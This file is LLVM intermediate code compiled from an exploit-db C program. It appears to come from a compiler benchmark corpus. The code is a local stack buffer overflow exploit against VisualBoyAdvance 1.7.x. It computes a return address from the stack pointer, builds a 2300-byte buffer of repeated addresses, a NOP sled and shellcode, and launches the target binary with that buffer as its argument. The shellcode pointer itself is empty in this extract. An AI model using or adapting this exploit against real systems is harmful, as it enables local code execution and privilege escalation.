; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_824.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_824.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [53 x i8] c"\0A ************************************************ \0A\00", align 1
@.str.1 = private unnamed_addr constant [51 x i8] c" VisualBoyAdvanced 1.7.x BufferOver Flow exploit \0A\00", align 1
@.str.2 = private unnamed_addr constant [45 x i8] c"            by Qnix[at]bsdmail[dot]org      \00", align 1
@.str.3 = private unnamed_addr constant [54 x i8] c"\0A ************************************************ \0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"[~] Stack pointer (ESP) : 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[~] Offset from ESP     : 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"[~] Desired Return Addr : 0x%x\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [51 x i8] c" VisualBoyAdvanced 1.7.x BufferOver Flow Exploit \0A\00", align 1
@.str.8 = private unnamed_addr constant [47 x i8] c"useage : ./vba-exp <VisualBoyAdvanced File> \0A\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [17 x i8] c"VisualBoyAdvance\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %13 = call i64 (...) @sp()
  store i64 %13, i64* %8, align 8
  %14 = load i64, i64* %8, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = sub nsw i64 %14, %16
  store i64 %17, i64* %9, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp sge i32 %18, 2
  br i1 %19, label %20, label %31

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  %25 = load i64, i64* %8, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i64 %25)
  %27 = load i32, i32* %7, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i32 %27)
  %29 = load i64, i64* %9, align 8
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i64 %29)
  br label %37

31:                                               ; preds = %2
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.8, i64 0, i64 0))
  br label %37

37:                                               ; preds = %31, %20
  %38 = call i8* @malloc(i32 2300)
  store i8* %38, i8** %11, align 8
  %39 = load i8*, i8** %11, align 8
  store i8* %39, i8** %12, align 8
  %40 = load i8*, i8** %12, align 8
  %41 = bitcast i8* %40 to i64*
  store i64* %41, i64** %10, align 8
  store i32 0, i32* %6, align 4
  br label %42

42:                                               ; preds = %49, %37
  %43 = load i32, i32* %6, align 4
  %44 = icmp slt i32 %43, 2300
  br i1 %44, label %45, label %52

45:                                               ; preds = %42
  %46 = load i64, i64* %9, align 8
  %47 = load i64*, i64** %10, align 8
  %48 = getelementptr inbounds i64, i64* %47, i32 1
  store i64* %48, i64** %10, align 8
  store i64 %46, i64* %47, align 8
  br label %49

49:                                               ; preds = %45
  %50 = load i32, i32* %6, align 4
  %51 = add nsw i32 %50, 4
  store i32 %51, i32* %6, align 4
  br label %42

52:                                               ; preds = %42
  store i32 0, i32* %6, align 4
  br label %53

53:                                               ; preds = %61, %52
  %54 = load i32, i32* %6, align 4
  %55 = icmp slt i32 %54, 1900
  br i1 %55, label %56, label %64

56:                                               ; preds = %53
  %57 = load i8*, i8** %11, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  store i8 -112, i8* %60, align 1
  br label %61

61:                                               ; preds = %56
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %6, align 4
  br label %53

64:                                               ; preds = %53
  %65 = load i8*, i8** %11, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1900
  store i8* %66, i8** %12, align 8
  store i32 0, i32* %6, align 4
  br label %67

67:                                               ; preds = %81, %64
  %68 = load i32, i32* %6, align 4
  %69 = load i32*, i32** @shellcode, align 8
  %70 = call i32 @strlen(i32* %69)
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %84

72:                                               ; preds = %67
  %73 = load i32*, i32** @shellcode, align 8
  %74 = load i32, i32* %6, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i32, i32* %73, i64 %75
  %77 = load i32, i32* %76, align 4
  %78 = trunc i32 %77 to i8
  %79 = load i8*, i8** %12, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %12, align 8
  store i8 %78, i8* %79, align 1
  br label %81

81:                                               ; preds = %72
  %82 = load i32, i32* %6, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %6, align 4
  br label %67

84:                                               ; preds = %67
  %85 = load i8*, i8** %11, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 2299
  store i8 0, i8* %86, align 1
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  %89 = load i8*, i8** %88, align 8
  %90 = load i8*, i8** %11, align 8
  %91 = call i32 @execl(i8* %89, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0), i8* %90, i32 0)
  %92 = load i8*, i8** %11, align 8
  %93 = call i32 @free(i8* %92)
  ret i32 0
}

declare dso_local i64 @sp(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
